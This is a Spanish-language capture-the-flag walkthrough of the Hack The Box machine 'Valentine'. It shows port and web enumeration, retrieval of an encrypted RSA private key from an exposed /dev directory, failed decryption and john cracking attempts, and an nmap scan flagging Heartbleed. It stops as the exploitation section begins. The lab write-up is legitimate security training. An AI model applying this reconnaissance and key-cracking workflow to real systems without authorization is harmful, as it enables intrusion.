---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Valentine

`Valentine` es una máquina de dificultad media muy singular que se centra en la vulnerabilidad Heartbleed, que tuvo un impacto devastador en los sistemas de todo el mundo.

<figure><img src="../../.gitbook/assets/Valentine.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con `nmap` para ver los puertos que están expuestos en la máquina **`Valentine`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.79 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-27 05:20 CET
Initiating SYN Stealth Scan at 05:20
Scanning 10.10.10.79 [65535 ports]
Discovered open port 443/tcp on 10.10.10.79
Discovered open port 22/tcp on 10.10.10.79
Discovered open port 80/tcp on 10.10.10.79
Completed SYN Stealth Scan at 05:21, 21.72s elapsed (65535 total ports)
Nmap scan report for 10.10.10.79
Host is up, received user-set (0.058s latency).
Scanned at 2025-02-27 05:20:45 CET for 21s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.84 seconds
           Raw packets sent: 65867 (2.898MB) | Rcvd: 65856 (2.635MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.79
	[*] Open ports: 22,80,443

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache` en protocolos `HTTP (80)` y `HTPTS (443)`.

```bash
❯ nmap -sCV -p22,80,443 10.10.10.79 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-27 05:21 CET
Nmap scan report for valentine.htb (10.10.10.79)
Host is up (0.061s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2025-02-27T04:23:03+00:00; +1m00s from scanner time.
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 59s

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   79.04 ms 10.10.14.1
2   66.02 ms valentine.htb (10.10.10.79)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/5248_vmware_Utbb3keLqC.png" alt=""><figcaption></figcaption></figure>

Añadiremos en nuestro archivo `/etc/hosts` la siguiente entrada correspondiente.

```bash
❯ cat /etc/hosts | grep valentine
10.10.10.79 valentine.htb
```

## Web Enumeration

Accederemos a [http://valentine.htb](http://valentine.htb) pero se nos redigie automáticamente a [https://valentine.htb](https://valentine.htb) en la cual nos encontramos con el siguiente contenido.

<figure><img src="../../.gitbook/assets/5250_vmware_LVdAdOEKvE.png" alt=""><figcaption></figcaption></figure>

Realizamos una enumeración de la aplicación web para intentar obtener archivos, directorios, etc. En el resultado se nos muestra un directorio llamado `/dev` el cual contiene dos archivos que deberemos explorar.

```bash
❯ feroxbuster -u https://valentine.htb -t 200 -C 500,502,404 -k
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://valentine.htb
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [500, 502, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      314c https://valentine.htb/dev => https://valentine.htb/dev/
200      GET        1l        2w       38c https://valentine.htb/index
200      GET      620l     3539w   275344c https://valentine.htb/omg.jpg
200      GET        1l        2w       38c https://valentine.htb/
200      GET        8l       39w      227c https://valentine.htb/dev/notes.txt
200      GET        2l     1794w     5383c https://valentine.htb/dev/hype_key
```

Nos descargaremos los archivos `hype_key` y `notes.txt` los cuales se encuentran en [https://valentine.htb/dev/](https://valentine.htb/dev/).

```bash
❯ wget https://valentine.htb/dev/hype_key --no-check-certificate
--2025-02-27 05:26:59--  https://valentine.htb/dev/hype_key
Resolviendo valentine.htb (valentine.htb)... 10.10.10.79
Conectando con valentine.htb (valentine.htb)[10.10.10.79]:443... conectado.
GnuTLS: Se recibió una alerta de advertencia TLS.
GnuTLS: received alert [112]: No se reconoció el nombre del servidor enviado
AVISO: El certificado de «valentine.htb» no es confiable.
AVISO: El certificado de «valentine.htb» no tiene un emisor conocido.
AVISO: El certificado de «valentine.htb» ha expirado.
Ha expirado el certificado
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 5383 (5,3K)
Grabando a: «hype_key»

hype_key     100%[=======================>]   5,26K  --.-KB/s    en 0,006s  

2025-02-27 05:26:59 (923 KB/s) - «hype_key» guardado [5383/5383]

❯ wget https://valentine.htb/dev/notes.txt --no-check-certificate
--2025-02-27 05:27:05--  https://valentine.htb/dev/notes.txt
Resolviendo valentine.htb (valentine.htb)... 10.10.10.79
Conectando con valentine.htb (valentine.htb)[10.10.10.79]:443... conectado.
GnuTLS: Se recibió una alerta de advertencia TLS.
GnuTLS: received alert [112]: No se reconoció el nombre del servidor enviado
AVISO: El certificado de «valentine.htb» no es confiable.
AVISO: El certificado de «valentine.htb» no tiene un emisor conocido.
AVISO: El certificado de «valentine.htb» ha expirado.
Ha expirado el certificado
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 227 [text/plain]
Grabando a: «notes.txt»

notes.txt      100%[======================>]     227  --.-KB/s    en 0s      

2025-02-27 05:27:05 (7,49 MB/s) - «notes.txt» guardado [227/227]
```

## Initial Access

### Attempting to decrypt an RSA Private Key (FAILED)

Nos encontramos con los dos siguientes archivos que deberemos analizar. En el archivo llamado `notes.txt` mencionan una especie de tareas que se deben realizar, sobretodo remarcan el tema de reparar un decodificador/codificador en el cual indican que solamente funcione desde el lado del cliente.

Por otro lado, el archivo `hype_key` contiene información codificada en lo que parece ser Hexadecimal, revisaremos a ver si podemos descodificar este archivo para obtener el archivo original.

{% tabs %}
{% tab title="notes.txt" %}
```bash
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```
{% endtab %}

{% tab title="hype_key" %}
```bash
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
```
{% endtab %}
{% endtabs %}

Realizaremos una decodificación a través de la herramienta `xxd` y comprobaremos el siguiente resultado.

En el resultado obtenido, comprobamos que el archivo `hype_key` se trata de una `PEM RSA Private Key`.

{% hint style="info" %}
Un **PEM RSA Private Key** es una clave privada RSA codificada en formato PEM (Privacy-Enhanced Mail). En este caso, la clave está cifrada con **AES-128-CBC**, lo que significa que para usarla necesitamos la contraseña con la que fue protegida.

Las claves privadas RSA se utilizan para el cifrado, la firma digital y la autenticación, por ejemplo, en SSH o certificados TLS/SSL. Si esta clave pertenece a un servidor o sistema crítico, podría permitir acceso no autorizado si se compromete.
{% endhint %}

```bash
❯ cat hype_key | xxd -r -p | sponge hype_key

❯ cat hype_key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----

❯ file hype_key
hype_key: PEM RSA private key
```

Realizamos una búsqueda por Internet para encontrar la manera de desencriptar esta `Private Key`. En el siguiente blog, se nos menciona que una de las maneras más efectivas de desencriptar el contenido es a través de `openssl`.

{% embed url="https://marco.maranao.ca/articles/how-decrypt-rsa-private-key-using-openssl" %}

<figure><img src="../../.gitbook/assets/imagen (450).png" alt=""><figcaption></figcaption></figure>

Intentaremos desencriptar la `Private Key` pero nos pide contraseña, al darle al `Enter` (es decir dejar la contraseña en blanco), nos mostraba el siguiente mensaje de error, indicando que no había sido posible desencriptar la clave. Por lo tanto, para intentar desencriptar esta clave, deberíamos buscar alguna manera de lograr obtener credenciales.

```bash
❯ openssl rsa -in hype_key -out hype_key_decrypted
Enter pass phrase for hype_key:
Could not find private key from hype_key
40778A23867F0000:error:1C800064:Provider routines:ossl_cipher_unpadblock:bad decrypt:../providers/implementations/ciphers/ciphercommon_block.c:107:
40778A23867F0000:error:04800065:PEM routines:PEM_do_header:bad decrypt:../crypto/pem/pem_lib.c:472:
```

También intentamos obtener el hash de la contraseña a través de `ssh2john` pero no logramos finalmente crackear la contraseña debido que esta contraseña no está dentro del diccionario `rockyou.txt`.

```bash
❯ ssh2john hype_key > hype_key.hash

❯ cat hype_key.hash
hype_key:$sshng$1$16$AEB88C140F69BF2074788DE24AE48D46$1200$0db3eb3bbf247a036e9350c0aa500de636e35efd0f3eca20de375b3054bc884f69dd438bd25174c5fecfce6ae40daf11e72fdbe3afbd9c4a4231f4cf84db8945c5b653680970e147fbd4490c10b95093144b5fe08c1ffbfcccb4d0cc31f9a23ad0423449b3985005755b8115ee6f7a42c663af026f9e355a7e6e95b0a6933c11e9ba07004af32acfbe96e9a6d165e5e211bc3aea18c5980bb8033a9c33f92280d4453d8b8d897ad7b35c3f75e2c2a8227e11ad53f3395ab3a7dc9a133c03ef0f39704a35eea5d7b84a693eb0167a7979739a5081ef1e7bcee9270755646b67bd1f7297298a62f5c35dd381d77602219da472c9a585082393ee3bac7e2d2f27d6bfc658ca923848a63510f58ffe7dff8bb744ead308a7a8f43b1346ab3693548741d5b01706976d8c93d6ec403129791eaf4e0f91c9f06d11e8923946f08d5108f0c741484e38cc8e72c8a718ef7eaf84a74803d1473294a9baac266a69cc2749d7475bc5b72f12660b17715b996de5d3e30240584549e5f751120a20f867eb823a5ea32c50f691a38b7eec9e7b47d809bec64ea39eec498c0777c623049d5bc382f0d593930a6373410b6e551aeae94eb7d82b4a8b114c2b19775e0e3edb386cbb292b130c3ac8272a5a17be794f392c12a56cbd5a9eb2f175fcf85e34af19795ea8435018729350b760f3a20ee3ce9cc5da2297b57606f435d0f533d65048d50bc350c70863cfe09492c57ec159d0ca6809d626f160940e2814105503cb803cc7d5d971509e3c144f96cf2c2eb9b45b2da11b53675b92aee6a2dbb9314e72d0fb043cee531a75db3519035e1ac2927fc47faec44a79e29c8a50de3c28de68baadab19e136816d834331b7aaf681bd44025a10ea38394db8f927baae61764fca50658cda7d195a629cf7372a91edb6f81ba6d7e258412c6589f9c993e152bf50af4f2990ec40ad7136763ede5fe6eaeb9eb7e4e27a4ea1db0254d0d51b3d3ee96b4bb2b848b5fb9d8f3dfd1679a1241ed95591c9367515f9e0252b2ff7e31fbf3df8d656f33885a693b59f11c59c1dcd7a9fd57421b48d00b9e34e1bc470f9327b506c7d26ec7fd160b946648070279df44a906546d4e572bb073f2d58e66e16732b02e169944d77c1c433ce9f3688cfd3d9d58d3698b565179344a2d56d36c1bbb53732fed5383d2293722121421588d2aa2c86f9653b2302b7614e64a7708275849ccfadd0da941a7f17d26eebf808c9cda5d8ab54a128e674517cafe268bdd7d51dc3c55f1e49814a14bea9aa9b97718e58649180a7e271b27210f42172c48b7dd9fad7ce7b2386561af2cbdb54d35f93ff5fc97ea8a76e2b2f60f2112a58a67b2e90108506464758d37278dedbe46853542a1d1e1cc75457a14ee06ba7e56e3ea6aa0ef30255ed436426f832302332c95ffbdc4af935c42f789c98838145d3f2c3a7bf2654255519664a116923c79bffc56c4f22527be6fce77cee576a8bb2e2da04cc582a6dfecc40c80ef78a3cd69a59980472ac729420bfc14c945e5309e74370e8935530cf0b7828a2dce116974967f4bd5bfcd5e91e319af161c74e3a088a5079a8d532cb049e4c11766b04655c7f41ae4646e0573881d996fc8cd345481991b31064d2087f38f542e8a5455066fc5efa63f60cae69ccf64ff5c52188b24c02510fbde42187244f0c9210f7

❯ john --wordlist:/usr/share/wordlists/rockyou.txt hype_key.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:18 DONE (2025-02-27 18:23) 0g/s 782416p/s 782416c/s 782416C/sie168..*7¡Vamos!
Session completed. 
```

### Nmap Enumeration --script vuln

Debido que se encuentra el `HTTPS (443)` habilitado, probamos de realizar un escaneo nuevamente con la herramienta de `Nmap`para realizar un escaneo con los scripts de `vuln`para detectar vulnerabilidades conocidas.

En el resultado obtenido, se comprueba que es vulnerable a `ssl-poodle` y `ssl-heartbleed` y `ssl-css-injection`.

```bash
❯ nmap -sCV -p443 --script vuln 10.10.10.79
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-27 05:35 CET
Nmap scan report for valentine.htb (10.10.10.79)
Host is up (0.050s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-csrf: Couldn''t find any CSRF vulnerabilities.
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|_      https://www.securityfocus.com/bid/70574
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://cvedetails.com/cve/2014-0160/
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.cvedetails.com/cve/2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-dombased-xss: Couldn't find any DOM based XSS.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.03 seconds
```

### Heartbleed Exploitation (**CVE-2014-0160)**

Con la herramienta de `testsl` verificamos nuevamente que el servicio es vulnerable a `Heartbleed`.

```bash
